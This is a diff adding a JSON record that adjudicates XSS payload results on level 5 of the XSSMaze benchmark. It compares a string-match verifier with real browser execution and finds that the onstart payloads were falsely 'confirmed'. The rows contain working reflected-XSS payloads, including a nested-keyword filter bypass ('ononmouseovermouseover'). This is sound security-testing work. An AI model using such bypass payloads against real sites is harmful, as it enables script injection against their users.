@@ -1,0 +1,61 @@
+{
+  "question": "Is Phase 391's onstart evidence conflict real on XSSMaze level5?",
+  "source": "hahwul/xssmaze @2976f2e, event_handler.cr level5; unchanged since c7a0a83",
+  "level5_page": "pure static <div {query}>...; NO script, NO dispatch",
+  "phase362_evidence": "browser-unavailable, headless=None, execution unverified",
+  "oracle": "Chromium load + hover (XSSMaze client-benchmark口径)",
+  "controls_valid": true,
+  "rows": [
+    {
+      "case": "control_positive_official_answer",
+      "raw_query": "x ononmouseovermouseover=alert('xssv_PHASE401') x",
+      "cleaned_query": "x onmouseover=alert('xssv_PHASE401') x",
+      "page_body": "<!doctype html><html><body><div x onmouseover=alert('xssv_PHASE401') x>Event Handler Test :: x onmouseover=alert('xssv_PHASE401') x</div></body></html>",
+      "action": "hover",
+      "browser_dialog": true,
+      "verifier_confirmed": true,
+      "verifier_detail": "token reflected in onmouseover handler"
+    },
+    {
+      "case": "control_negative_plain",
+      "raw_query": "div id=x",
+      "cleaned_query": "div id=x",
+      "page_body": "<!doctype html><html><body><div div id=x>Event Handler Test :: div id=x</div></body></html>",
+      "action": "hover",
+      "browser_dialog": false,
+      "verifier_confirmed": false,
+      "verifier_detail": "token not reflected"
+    },
+    {
+      "case": "phase362_marquee_onstart",
+      "raw_query": "marquee onstart=alert('xssv_PHASE401')",
+      "cleaned_query": "marquee onstart=alert('xssv_PHASE401')",
+      "page_body": "<!doctype html><html><body><div marquee onstart=alert('xssv_PHASE401')>Event Handler Test :: marquee onstart=alert('xssv_PHASE401')</div></body></html>",
+      "action": "hover",
+      "browser_dialog": false,
+      "verifier_confirmed": true,
+      "verifier_detail": "token reflected in onstart handler"
+    },
+    {
+      "case": "phase391_div_onstart",
+      "raw_query": "div onstart=alert('xssv_PHASE401')",
+      "cleaned_query": "div onstart=alert('xssv_PHASE401')",
+      "page_body": "<!doctype html><html><body><div div onstart=alert('xssv_PHASE401')>Event Handler Test :: div onstart=alert('xssv_PHASE401')</div></body></html>",
+      "action": "hover",
+      "browser_dialog": false,
+      "verifier_confirmed": true,
+      "verifier_detail": "token reflected in onstart handler"
+    },
+    {
+      "case": "onstart_nested_bypass",
+      "raw_query": "x ononstartstart=alert('xssv_PHASE401') x",
+      "cleaned_query": "x ononstartstart=alert('xssv_PHASE401') x",
+      "page_body": "<!doctype html><html><body><div x ononstartstart=alert('xssv_PHASE401') x>Event Handler Test :: x ononstartstart=alert('xssv_PHASE401') x</div></body></html>",
+      "action": "hover",
+      "browser_dialog": false,
+      "verifier_confirmed": true,
+      "verifier_detail": "token reflected in ononstartstart handler"
+    }
+  ],
+  "verdict": "adjudicated: onstart shapes are verifier-confirmed but NOT browser-executable on the real level5 page; Phase 391's 'evidence conflict' was constructed from a non-evidence (all onstart browser_dialog=False, any verifier_confirmed=True)"
+}
